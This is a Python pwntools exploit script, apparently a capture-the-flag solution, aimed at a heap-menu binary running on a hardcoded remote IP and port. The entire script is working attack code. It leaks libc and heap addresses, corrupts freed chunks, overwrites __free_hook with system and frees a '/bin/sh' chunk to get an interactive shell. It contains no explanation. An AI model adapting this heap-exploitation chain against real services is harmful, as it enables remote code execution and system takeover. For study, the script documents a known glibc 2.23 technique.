from pwn import *

#sh = process('./pwn')
#sh = remote('5f0cfa41a052c741f4beafe9d083d281.kr - lab.com',58512)
sh = remote('39.106.224.151','60006')
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')



def add(size,con):
    sh.recvuntil('Your choice:')
    sh.sendline('2')
    sh.recvuntil('daily:')
    sh.sendline(str(size))
    sh.recvuntil('daily\n')
    sh.send(con)
def dele(idx):
    sh.recvuntil('choice:')
    sh.sendline('4')
    sh.recvuntil('daily:')
    sh.sendline(str(idx))
def edit(idx,con):
    sh.recvuntil('Your choice:')
    sh.sendline('3')
    sh.recvuntil('daily:')
    sh.sendline(str(idx))
    sh.recvuntil('daily')
    sh.send(con)
def show():
    sh.recvuntil('choice:')
    sh.sendline('1')


add(0x20,'A')
add(0x800,'A')
add(0x10,'A')
dele(1)
#gdb.attach(sh)

add(0x100,'AAAAAAAA')
show()
sh.recvuntil('A'*8)
main_arena = u64(sh.recv(6).ljust(8,'\x00')) - 0x548

libc_base = main_arena - libc.symbols['__malloc_hook'] - 0x10
one_gadget = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']

#gdb.attach(sh)
edit(1,'A'*24)
show()
sh.recvuntil('A'*24)
heap = u64(sh.recv(4).ljust(8,'\x00'))

#gdb.attach(sh)

add(0x700 - 8,'AAA')
add(0x10,'AAA')
add(0x10,'AAA')
dele(4)
dele(5)
index = (heap + 0x10 - 0x602060)/16
payload = p64(0x100) + p64(heap + 0x830 + 0x10)
edit(1,payload)
dele(index)

add(0x10,p64(0x602058))
add(0x10,'C')
add(0x10,'d')
add(0x10,'d')

edit(7,p64(free_hook))
edit(0,p64(one_gadget))
edit(1,'/bin/sh\x00')
dele(1)

sh.interactive()
